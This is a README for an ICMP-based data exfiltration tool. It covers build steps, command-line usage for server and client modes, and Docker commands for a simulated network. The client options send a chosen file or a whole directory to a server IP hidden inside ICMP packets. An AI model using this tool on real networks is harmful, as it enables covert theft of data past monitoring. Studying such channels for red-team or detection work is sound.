# 📋 ICMP Extraction
The ICMP-EXtraction project is a client-server application designed for data exfiltration via the ICMP protocol. The client sends data in the form of ICMP requests, while the server receives them and stores them in a folder.

# ⚙️ Features
- Sending data via client
- Server receives and processes data
- Management of multiple clients

# 🚀 Installation

### Prerequisites
     - sudo permissions required (for sending and receiving ICMP packets)
     - GCC version >= 13.2.0.7
     - Cmake
     - Valgrind (for memory leak checks)
     - Criterion (for tests)

### Setting up
```
$ git clone https://github.com/NearXa/icmp
$ cd icmp
$ make
```
# 📑 Usage
```
ICMP-EX: ICMP-Based data exfiltration
Usage: ./src/icmp.o [-c <server IP> || -s] [-f <file path> || -d <directory path>]
-s, --server
        Server mode (default value) : Receive Data
        [Incompatible with -c, --client]
-c, --client <server IP> (default value)
        Client mode: Send Data
        [Incompatible with -s, --server]
-f, --file <file path>
        Client Only: specified data file to transfer
        [Incompatible with -d, --directory]
-d, --directory <directory path>
        Client Only: specified directory, each file in the specified directory will be extracted (not recursivly)
        [Incompatible with -f, --file]
```


# 🐳 Docker
- GCC docker image is needed
```
docker pull gcc
```
- To use the program in a simulated network in Docker containers, you can execute the following commands:
    ### Server
    Server-mode containers can be created simply with
    ```
    make container
    ```
    or manually in the same folder as the Dockerfile with
    ```
    sudo docker build --build-arg ARGS="-s" --tag icmp-server .
    sudo docker run -it --privileged --init --rm --name icmp-server icmp-server
    ```
    (privileged mode is required to disable system response icmp packages)

    ### Client
    Do this manually in the same folder as the Dockerfile, modifying the arguments after "ARGS=".
    ```
    sudo docker build --build-arg ARGS="-c <serverip> -f <file>" --tag icmp-client .
    sudo docker run -it --privileged --init --rm --name icmp-client icmp-client
    ```
    (privileged mode is required to disable system response icmp packages)